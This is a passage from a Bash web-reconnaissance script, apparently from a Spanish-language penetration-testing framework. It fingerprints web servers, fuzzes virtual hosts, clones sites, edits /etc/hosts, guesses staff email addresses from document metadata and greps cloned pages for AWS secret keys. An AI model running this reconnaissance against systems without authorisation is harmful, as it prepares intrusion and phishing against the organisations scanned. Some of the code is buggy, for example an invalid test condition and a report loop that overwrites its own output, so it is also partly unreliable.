										lbd $subdominio > logs/enumeracion/"$subdominio"_web_balanceador.txt
										grep "does Load-balancing" logs/enumeracion/"$subdominio"_web_balanceador.txt > .enumeracion/"$subdominio"_web_balanceador.txt	
									fi							
										

									###  if the server is apache ######
									egrep -i "apache|nginx|kong" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" # solo el segundo egrep poner "-q"
									greprc=$?
									if [[ $greprc -eq 0  ]];then # si el banner es Apache																							
										enumeracionApache "http" $subdominio $port								
									else
										echo -e "\t\t[+] No es Apache o no debemos escanear"
									fi						
									####################################	
									
													
									#######  if the server is SharePoint ######
									grep -i SharePoint .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"  # no redirecciona
									greprc=$?
									if [[ $greprc -eq 0  ]];then # si el banner es IIS 																															
										enumeracionSharePoint "http" $subdominio $port								
									else
										echo -e "\t\t[+] No es SharePoint o no debemos escanear"									   
									fi										
									####################################	
									

									#######  if the server is IIS ######
									grep -i IIS .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|NodeJS|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra"  # no redirecciona
									greprc=$?
									if [[ $greprc -eq 0  ]];then # si el banner es IIS 																															
										enumeracionIIS "http" $subdominio $port								
									else
										echo -e "\t\t[+] No es IIS o no debemos escanear"									   
									fi
												
									####################################	
				
				
									#######  if the server is tomcat ######
									egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found" 
									greprc=$?				
									if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes																							
										enumeracionTomcat "http" $subdominio $port																							
									else
										echo -e "\t\t[+] No es tomcat o no debemos escanear"
									fi
												
									####################################
									echo -e "\t\t[+] Enumerar CMSs"
									enumeracionCMS "http" $subdominio $port	
									####################################

									# if not technology not reconigzed
									
									serverType=`cat .enumeracion/"$subdominio"_"$port"_webData.txt | cut -d "~" -f2`
									echo -e "\t\t[+] serverType $serverType"					
									if [  -z "$serverType" ]; then
										enumeracionDefecto "http" $subdominio $port
									fi																									
									grep '\.action' .enumeracion/* | egrep -v '301|302' |  awk '{print $2}' >> servicios/Apache-Struts-files.txt
																
																	
								else
									echo -e "\t\t[+] Redirección, error de proxy detectado o sitio ya escaneado \n"	
								fi												
							fi #hosting
						done #subdominio
					

					####################################
					if [ "$PROXYCHAINS" == "n" ]; then 
						echo -e "\t\t[+] Clonar sitios"
						cloneSite "http" $subdominio $port	
					fi  					
					####################################	
													    								
				fi #rev por dominio
				################################
				
				################# Comprobar que no haya muchos scripts ejecutandose ########
				while true; do
					free_ram=`free -m | grep -i mem | awk '{print $7}'`		
					perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 	
					if [[ $free_ram -lt $min_ram || $perl_instancias -gt $max_perl_instancias  ]];then 
						echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
						sleep 10	
					else		
						break
					fi
				done	
				####################################

				
				#################  Realizar el escaneo por IP  ##############	
				echo -e "\n[+]\tEscaneo solo por IP (http) $ip:$port"
				#wget --timeout=20 --tries=1 --no-check-certificate  http://$ip -O webClone/http-$ip.html
				$proxychains curl.pl --url  http://$ip > webClone/http-$ip.html
				sed -i "s/\/index.php//g" webClone/http-$ip.html
				sed -i "s/https/http/g" webClone/http-$ip.html				 			
				sed -i "s/www.//g" webClone/http-$ip.html	# En el caso de que www.dominio.com sea igual a dominio.com		
				
				#Borrar lineas que cambian en cada peticion
				egrep -v "lae-portfolio-header|script|visitas|contador" webClone/http-$ip.html > webClone/http2-$ip.html
				mv webClone/http2-$ip.html webClone/http-$ip.html
				
				checksumline=`md5sum webClone/http-$ip.html` 							
				md5=`echo $checksumline | awk {'print $1'}` 										
				egrep -iq $md5 webClone/checksumsEscaneados.txt
				noEscaneado=$?	
																																			
				egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused" .enumeracion/"$ip"_"$port"_webData.txt
				hostOK=$?	
						
				egrep -qi "403" .enumeracion/"$ip"_"$port"_webData.txt #403 - Prohibido: acceso denegado.
				accesoDenegado=$?	
						
						
				# 1= no coincide (no redirecciona a otro dominio o es error de proxy)			
				echo -e "\tnoEscaneado $noEscaneado hostOK $hostOK accesoDenegado $accesoDenegado (0=acceso negado)"
						
				if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios
					echo -e "\t[+]Realizando tests adicionales "	
					echo $checksumline >> webClone/checksumsEscaneados.txt
					
					if [ $internet == "s" ]; then 
						echo -e "\t[+] identificar si el host esta protegido por un WAF "
						wafw00f http://$ip:$port > logs/enumeracion/"$ip"_"$port"_wafw00f.txt
						grep "is behind" logs/enumeracion/"$ip"_"$port"_wafw00f.txt > .enumeracion/"$ip"_"$port"_wafw00f.txt	
					fi													

					echo -e "\t[+] Revisando vulnerabilidades CMS"
					enumeracionCMS "http" $ip $port

					#######  if the server is SharePoint ######
					grep -i SharePoint .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"  # no redirecciona
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es IIS 																															
						enumeracionSharePoint "http" $ip $port						
					else
						echo -e "\t[+] No es SharePoint o no debemos escanear"									   
					fi										
					####################################	

					#######  if the server is IIS ######
					grep -i IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|NodeJS|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra"  # no redirecciona
					greprc=$?
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes						
						enumeracionIIS "http" $ip $port											
					else
						echo -e "\t[+] No es IIS o no debemos escanear"
					fi
										
					####################################	
		
		
					#######  if the server is tomcat ######					
					egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs|Cloudflare"  # no redirecciona
					greprc=$?				
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Java y no se enumero antes					
						enumeracionTomcat "http" $ip $port							
					else
						echo -e "\t[+] No es Tomcat o no debemos escanear"
					fi
											
					####################################	
			

					#######  if the server is apache ######
					egrep -i "apache|nginx|kong" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Nextcloud|Open Source Routing Machine|ownCloud|Cloudflare" # solo el segundo egrep poner "-q"
					greprc=$?
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes																								
						enumeracionApache "http" $ip $port												
					else
						echo -e "\t[+] No es Apache o no debemos escanear"
					fi						
					####################################	

					#######  if the server is IoT ######
					enumeracionIOT	"http" $ip $port
					if [ "$PROXYCHAINS" == "n" ]; then 
						cloneSite "http" $ip $port	
					fi  
					
					####################################	

					# if not technology not reconigzed
					
					serverType=`cat .enumeracion/"$ip"_"$port"_webData.txt | cut -d "~" -f2`
					echo -e "\t[+] serverType $serverType"					
					if [  -z "$serverType" ]; then
						enumeracionDefecto "http" $ip $port
					fi							
					grep '\.action' .enumeracion/* | egrep -v '301|302' |  awk '{print $2}' >> servicios/Apache-Struts-files.txt
												
								
				fi # fin si no hay redireccion http --> https 
								
			break
		else
			perl_instancias=`ps aux | grep perl | wc -l`
			echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
			sleep 3
		fi
		done # done true			
	done	# done for                       
	
	################# si hay menos de 12 scripts de perl continua el script ##############
	while true; do
		free_ram=`free -m | grep -i mem | awk '{print $7}'`		
		perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 		
		if [[ $free_ram -lt $min_ram || $perl_instancias -gt $max_perl_instancias  ]];then 
			echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
			sleep 10	
		else
			echo "ok"
			break
		fi
	done	
	#################################################################################
	
	# check apache Struts
	echo -e "[+] Check apache Struts"										
	apacheStrutsCheck

	#insert clean data		
	insert_data
fi # file exists



if [ -f servicios/web-ssl.txt ]
then    
    
    echo -e "$OKBLUE #################### WEB - SSL (`wc -l servicios/web-ssl.txt`) ######################$RESET"	    		
	echo -e "$OKGREEN[i] Identificacion de técnologia usada en los servidores web$RESET"
	touch webClone/checksumsEscaneados.txt
	if [ $internet == "s" ]; then 
		DOMINIO_INTERNO=$DOMINIO_EXTERNO
	fi

	echo -e "\t DOMINIO_INTERNO $DOMINIO_INTERNO"
	# Extraer informacion web y SSL
	for line in $(cat servicios/web-ssl.txt); do    
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	

		echo -e "\t [+] Scanning $ip $port"
		
		$proxychains get_ssl_cert.py $ip $port  2>/dev/null > logs/enumeracion/"$ip"_"$port"_cert.txt 
		cp logs/enumeracion/"$ip"_"$port"_cert.txt  .enumeracion/"$ip"_"$port"_cert.txt 

		SUBDOMINIOS_INTERNOS=`cat .enumeracion/"$ip"_"$port"_cert.txt | tr "'" '"'| jq | grep subdomain | awk '{print $2}' | tr -d '",'| sed "s/*.//g" |  grep --color=never $DOMINIO_INTERNO| uniq` 
		for SUBDOMINIO_INTERNO in $SUBDOMINIOS_INTERNOS; do	
			if [[ ${SUBDOMINIO_INTERNO} == *"enterpriseregistration.windows.net"*  ]];then 
				echo "$SUBDOMINIO_INTERNO" >> .enumeracion/"$ip"_"$port"_azureAD.txt 
			else
				DOMINIO_INTERNO=$SUBDOMINIO_INTERNO
				echo "$ip $DOMINIO_INTERNO" >> /etc/hosts
				echo "$ip,$DOMINIO_INTERNO,vhost" >> $prefijo$IP_LIST_FILE
			fi		
		done
		
		if [ "$MODE" == "hacking" && "$hosting" == 'n' ]; then 							
			echo -e "\t [+] Seeking virtual hosts"

			if [ $internet == "n" ]; then 
				DOMINIO_INTERNO=`nmap -Pn -sV -n -p $port $ip | grep 'Host:' | awk '{print $4}'`
				
				#Extraer dominio del status
				if [ -z "$DOMINIO_INTERNO" ]; then 
					DOMINIO_INTERNO=`webData.pl -t $ip -p $port -s https -e todo -d / -l /dev/null -r 4 | grep 'Name or service not known' | cut -d "~" -f2`
				fi

				echo "$ip $DOMINIO_INTERNO" >> /etc/hosts
				echo "$ip,$DOMINIO_INTERNO,vhost" >> $prefijo$IP_LIST_FILE							

			fi
			

			echo -e "\t [+] DOMINIO_INTERNO $DOMINIO_INTERNO"
			if [ ! -z "$DOMINIO_INTERNO" ]; then

				wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomain.txt -H "Host: FUZZ.$DOMINIO_INTERNO" -u https://$DOMINIO_INTERNO -t 100 -f logs/enumeracion/baseline_https_vhosts.txt	2>/dev/null
				chars=`cat logs/enumeracion/baseline_https_vhosts.txt | grep 'C=' | awk '{print $7}'`
				echo "chars $chars"
				
				wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$DOMINIO_INTERNO" -u https://$DOMINIO_INTERNO -t 100 --hh $chars --hc 401 -f logs/enumeracion/"$ip"_"$port"_vhosts.txt	2>/dev/null
				grep 'Ch' logs/enumeracion/"$ip"_"$port"_vhosts.txt | grep -v 'Word' | awk '{print $9}' | tr -d '"' > .enumeracion/"$ip"_"$port"_vhosts.txt
				vhosts=`cat .enumeracion/"$ip"_"$port"_vhosts.txt`

				for vhost in $vhosts; do					
						echo -e "\t\t[+] Adicionando vhost $vhost a los targets"	
						echo "$ip $vhost.$DOMINIO_INTERNO" >> /etc/hosts
						echo "$ip,$vhost.$DOMINIO_INTERNO,vhost" >> $prefijo$IP_LIST_FILE
				done
				
			fi				
		fi


		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			perl_instancias=$((`ps aux | grep webData | wc -l` - 1)) 
			python_instancias=$((`ps aux | grep get_ssl_cert | wc -l` - 1)) 
			script_instancias=$((perl_instancias + python_instancias))
			
		   #if [[ $free_ram -gt $min_ram && $script_instancias -lt 10  ]];then 	
			if [[ $free_ram -gt $min_ram && $script_instancias -lt 4  ]];then 	
				echo -e "[+] Escaneando $ip:$port"
				echo -e "\t[+] Obteniendo información web"
				$proxychains webData.pl -t $ip -p $port -s https -e todo -d / -l logs/enumeracion/"$ip"_"$port"_webData.txt -r 4 > .enumeracion/"$ip"_"$port"_webData.txt 2>/dev/null  &	
				echo -e "\t[+] Obteniendo información del certificado SSL"				
				echo -e "\t"	
				sleep 0.5;	
				
				######## revisar por dominio #######
				if grep -q "," "$prefijo$IP_LIST_FILE" 2>/dev/null; then			
					lista_subdominios=`grep --color=never $ip $prefijo$IP_LIST_FILE | egrep 'subdomain|vhost'| cut -d "," -f2 | grep --color=never $DOMINIO_INTERNO | uniq` 				
					#echo "lista_subdominios $lista_subdominios"
					for subdominio in $lista_subdominios; do
						if [[  ${subdominio} != *"cpanel."* && ${subdominio} != *"cpcalendars."* && ${subdominio} != *"cpcontacts."*  && ${subdominio} != *"ftp."* && ${subdominio} != *"webdisk."* && ${subdominio} != *"webmail."* && ${subdominio} != *"autodiscover."* && ${subdominio} != *"whm."* ]];then 
							echo -e "\t\t[+] Obteniendo informacion web (subdominio: $subdominio)"	
							$proxychains webData.pl -t $subdominio -p $port -s https -e todo -d / -l logs/enumeracion/"$subdominio"_"$port"_webData.txt -r 4 > .enumeracion/"$subdominio"_"$port"_webData.txt 2>/dev/null 
						fi
					done
				fi
				################################	
				
				break
			else				
				perl_instancias=`ps aux | grep perl | wc -l`
				echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
				sleep 3										
			fi		
	    done # while true
	 done # for

	 ######## wait to finish ########
	  while true; do
		perl_instancias=$((`ps aux | egrep "webData.pl|get_ssl_cert" | wc -l` - 1)) 
		if [ "$perl_instancias" -gt 0 ]
		then
			echo -e "\t[i] Todavia hay escaneos de perl/python activos ($perl_instancias)"  
			sleep 30
		else
			break		  		 
		fi				
	  done
	  ##############################

	echo -e "$OKGREEN\n[i] Realizando la navegacion forzada $RESET"
	for line in $(cat servicios/web-ssl.txt); do    
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`				
		echo -e "\n[+] Escaneando $ip:$port"
		
		while true; do
				free_ram=`free -m | grep -i mem | awk '{print $7}'`		
				perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 			   
				if [[ $free_ram -gt $min_ram && $perl_instancias -lt $max_perl_instancias  ]];then 
			 				
				#echo "FILE $prefijo$IP_LIST_FILE"				
				######## revisar por dominio #######
				if grep -q "," "$prefijo$IP_LIST_FILE" 2>/dev/null; then
					lista_subdominios=`grep --color=never $ip $prefijo$IP_LIST_FILE | egrep 'subdomain|vhost'| cut -d "," -f2 | grep --color=never $DOMINIO_INTERNO| uniq` 
					#echo "lista_subdominios $lista_subdominios"
					for subdominio in $lista_subdominios; do
						if [[  ${subdominio} != *"cpanel."* && ${subdominio} != *"cpcalendars."* && ${subdominio} != *"cpcontacts."*  && ${subdominio} != *"ftp."* && ${subdominio} != *"webdisk."* && ${subdominio} != *"webmail."* && ${subdominio} != *"autodiscover."* && ${subdominio} != *"whm."* ]];then 
							echo -e "\t[+] subdominio: $subdominio"	
																			
							#wget --timeout=20 --tries=1 --no-check-certificate  https://$subdominio -O webClone/https-$subdominio.html
							$proxychains curl.pl --url  https://$subdominio > webClone/https-$subdominio.html
							sed -i "s/\/index.php//g" webClone/https-$subdominio.html 2>/dev/null
							sed -i "s/https/http/g" webClone/https-$subdominio.html 2>/dev/null		
							sed -i "s/www.//g" webClone/https-$subdominio.html 2>/dev/null # borrar subdominio www.dominio.com						
													
							#Borrar lineas que cambian en cada peticion
							egrep -v "lae-portfolio-header|script|visitas|contador" webClone/https-$subdominio.html > webClone/https2-$subdominio.html
							mv webClone/https2-$subdominio.html webClone/https-$subdominio.html
							
							checksumline=`md5sum webClone/https-$subdominio.html` 							
							md5=`echo $checksumline | awk {'print $1'}` 													
							egrep -iq $md5 webClone/checksumsEscaneados.txt
							noEscaneado=$?

							egrep -iq "no Route matched with those values" webClone/https-$subdominio.html
							greprc=$?
							if [[ $greprc -eq 0  ]];then # si el host es kong
								noEscaneado=1
							fi	
							
							egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused" .enumeracion/"$subdominio"_"$port"_webData.txt
							hostOK=$?	
							
							egrep -qi "403" .enumeracion/"$subdominio"_"$port"_webData.txt #403 - Prohibido: acceso denegado.
							accesoDenegado=$?	
							
							
							# 1= no coincide (no redirecciona a otro dominio o es error de proxy)			
							echo -e "\t\tnoEscaneado $noEscaneado hostOK $hostOK accesoDenegado $accesoDenegado (0=acceso negado)"
							
							if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios
								echo "Realizando tests adicionales "
								echo $checksumline >> webClone/checksumsEscaneados.txt												
								

								if [ $internet == "s" ]; then 
									echo -e "\t[+] identificar si el host esta protegido por un WAF "
									wafw00f https://$subdominio:$port > logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt
									grep "is behind" logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt > .enumeracion/"$subdominio"_"$port"_wafw00f.txt								
								fi	
								
							
															
								###  if the server is apache ######
								egrep -i "apache|nginx|kong" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" # solo el segundo egrep poner "-q"
								greprc=$?
								if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes																
									enumeracionApache "https" $subdominio $port
								fi						
								####################################	

								#######  if the server is SharePoint ######
								grep -i SharePoint .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"  # no redirecciona
								greprc=$?
								if [[ $greprc -eq 0  ]];then # si el banner es SharePoint 																															
									enumeracionSharePoint "https" $subdominio $port
								else
									echo -e "\t\t[+] No es SharePoint o no debemos escanear"									   
								fi										
								####################################
								
								#######  if the server is IIS ######
								grep -i IIS .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|NodeJS|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra"  # no redirecciona
								greprc=$?
								if [[ $greprc -eq 0  ]];then # si el banner es IIS y no se enumero antes															
									enumeracionIIS "https" $subdominio $port								   
								fi
											
								####################################	
			
			
								#######  if the server is tomcat ######
								egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found" 
								greprc=$?				
								if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes								
									enumeracionTomcat "https" $subdominio $port																							
								fi
											
								####################################
									
								enumeracionCMS "https" $subdominio $port																						
								testSSL "https" $subdominio $port	

								# if not technology not reconigzed
								
								serverType=`cat .enumeracion/"$subdominio"_"$port"_webData.txt | cut -d "~" -f2`
								echo -e "\t\t[+] serverType $serverType"
								
								if [  -z "$serverType" ]; then
									enumeracionDefecto "https" $subdominio $port
								fi								
								grep '\.action' .enumeracion/* | egrep -v '301|302' |  awk '{print $2}' >> servicios/Apache-Struts-files.txt
							else
									echo -e "\t\t[+] Redirección, error de proxy detectado o sitio ya escaneado \n"	
							fi														
						fi #hosting
					done # subdominios 
			  fi # revisar por dominio
				################################
				
				
				
				################# Comprobar que no haya muchos scripts ejecutandose ########
				while true; do
					free_ram=`free -m | grep -i mem | awk '{print $7}'`		
					perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 	
					if [[ $free_ram -lt $min_ram || $perl_instancias -gt $max_perl_instancias  ]];then 
						echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
						sleep 10	
					else		
						break
					fi
				done	
				####################################
				
				
				############### Escaneo por IP ############				
				echo -e "\n[+]\tEscaneo solo por IP (https) $ip:$port"
				#wget --timeout=20 --tries=1 --no-check-certificate  https://$ip -O webClone/https-$ip.html
				$proxychains curl.pl --url  https://$ip > webClone/https-$ip.html
				sed -i "s/\/index.php//g" webClone/https-$ip.html 2>/dev/null
				sed -i "s/https/http/g" webClone/https-$ip.html 2>/dev/null				
				sed -i "s/www.//g" webClone/https-$ip.html 2>/dev/null # 
				
				#Borrar lineas que cambian en cada peticion
				egrep -v "lae-portfolio-header|script|visitas|contador" webClone/https-$ip.html > webClone/https2-$ip.html
				mv webClone/https2-$ip.html webClone/https-$ip.html
				
				
				checksumline=`md5sum webClone/https-$ip.html` 							
				md5=`echo $checksumline | awk {'print $1'}` 													
				egrep -iq $md5 webClone/checksumsEscaneados.txt
				noEscaneado=$?
				
				egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused|GoAhead-Webs" .enumeracion/"$ip"_"$port"_webData.txt
				hostOK=$?	#1= no es redireccion, o genero un error al conectar
						
				egrep -qi "403" .enumeracion/"$ip"_"$port"_webData.txt #403 - Prohibido: acceso denegado. Enumerar de todas maneras
				accesoDenegado=$?	
						
						
				# 1= no coincide (no redirecciona a otro dominio o es error de proxy)			
				echo -e "\t\tnoEscaneado $noEscaneado hostOK $hostOK accesoDenegado $accesoDenegado (0=acceso negado)"
						
				if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios								
					echo "Realizando tests adicionales " 
					echo $checksumline >> webClone/checksumsEscaneados.txt
					

					if [ $internet == "s" ]; then 
						echo -e "\t[+] identificar si el host esta protegido por un WAF "
						wafw00f https://$ip:$port > logs/enumeracion/"$ip"_"$port"_wafw00f.txt
						grep "is behind" logs/enumeracion/"$ip"_"$port"_wafw00f.txt > .enumeracion/"$ip"_"$port"_wafw00f.txt
					fi	
					
							
					testSSL "https" $ip $port				
					enumeracionCMS "https" $ip $port							
																							
					#######  if the server is apache ######
					egrep -i "apache|nginx|kong" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" # solo el segundo egrep poner "-q"
					greprc=$?				
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes						
						enumeracionApache "https" $ip $port
					fi						
					####################################

					#######  if the server is SharePoint ######
					grep -i SharePoint .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"  # no redirecciona
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es SharePoint 																															
						enumeracionSharePoint "https" $ip $port
					else
						echo -e "\t\t[+] No es SharePoint o no debemos escanear"									   
					fi										
					####################################
		
					#######  if the server is IIS ######
					grep -qi IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|NodeJS|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra" 
					greprc=$?
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes											
						enumeracionIIS "https" $ip $port																
					fi
									
					####################################
				
					#######  if the server is java ######
					egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found" 
					greprc=$?				
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es JAVA y no se enumero antes				
						enumeracionTomcat "https" $ip $port																				
					fi									
					####################################								

					# if not technology not reconigzed
					
					serverType=`cat .enumeracion/"$ip"_"$port"_webData.txt | cut -d "~" -f2`
					echo -e "\t\t[+] serverType $serverType"					
					if [  -z "$serverType" ]; then
						enumeracionDefecto "https" $ip $port
					fi						
					grep '\.action' .enumeracion/* | egrep -v '301|302' |  awk '{print $2}' >> servicios/Apache-Struts-files.txt					


				fi # fin si no hay redireccion http --> https
													
				break
			else
				perl_instancias=`ps aux | grep perl | wc -l`
				echo -e "\t[-] Poca RAM ($free_ram Mb) ó maximo número de instancias de perl ($perl_instancias) "
				sleep 3
			fi
    	done	# done true			
   done #for
   
	################# si hay menos de 12 scripts de perl continua el script ##############
	while true; do
		free_ram=`free -m | grep -i mem | awk '{print $7}'`		
		perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 		
		if [[ $free_ram -lt $min_ram || $perl_instancias -gt $max_perl_instancias  ]];then 
			echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
			sleep 10	
		else
			echo "ok"
			break
		fi
	done	

	# check apache Struts
	echo -e "[+] Check apache Struts"										
	apacheStrutsCheck

	############################################################################
	echo -e "[+] Extraer metadatos de sitios clonados"										
	exiftool archivos > logs/enumeracion/"$DOMINIO_EXTERNO"_metadata_exiftool.txt
	egrep -i "Author|creator" logs/enumeracion/"$DOMINIO_EXTERNO"_metadata_exiftool.txt | awk '{print $3}' | egrep -iv "tool|adobe|microsoft|PaperStream|Acrobat|JasperReports|Mozilla" |sort |uniq  > .enumeracion/"$DOMINIO_EXTERNO"_metadata_exiftool.txt

	##### Reporte metadatos (sitio web) ##
	sed 's/ /-/g' -i .enumeracion/"$DOMINIO_EXTERNO"_metadata_exiftool.txt # cambiar espacios por "-"
	echo "Nombre;Apellido;Correo;Cargo" > reportes/correos_metadata.csv
	for nombreCompleto in `more .enumeracion/"$DOMINIO_EXTERNO"_metadata_exiftool.txt`; do	
	#echo "nombreCompleto $nombreCompleto"
		if [[ ${nombreCompleto} == *"-"*  ]];then 			
			nombre=`echo $nombreCompleto | cut -f1 -d "-"`
			apellido=`echo $nombreCompleto | cut -f2 -d "-"`
			echo "$nombre;$apellido;$apellido@$DOMINIO_EXTERNO;n/a" > reportes/correos_metadata.csv 
		fi
	done
	################

	#  Eliminar URLs repetidas (clonacion)
	echo -e "[+] Eliminar URLs repetidas (Extraidos de la clonacion)"										
	sort logs/enumeracion/"$DOMINIO_EXTERNO"_web_wget2.txt 2>/dev/null | uniq > .enumeracion/"$DOMINIO_EXTERNO"_web_wgetURLs.txt
	


	# filtrar error de conexion a base de datos y otros errores
	egrep -ira --color=never "mysql_query| mysql_fetch_array|access denied for user|mysqli|Undefined index" webClone/* 2>/dev/null| sed 's/webClone\///g' >> .enumeracion/"$DOMINIO_EXTERNO"_web_errores.txt

	# correos presentes en los sitios web
	grep -Eirao "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" webClone/* | cut -d ":" -f2 | egrep --color=never $"com|net|org|bo|es" |  sort |uniq  >> .enumeracion/"$DOMINIO_EXTERNO"_web_correos.txt

	# aws_access_key 
	egrep -ira --color=never "aws_access_key_id|aws_secret_access_key" webClone/* > .vulnerabilidades/"$DOMINIO_EXTERNO"_aws_secrets.txt 

	echo -e "[+] Buscar datos sensible en archivos clonados"	
	cd webClone
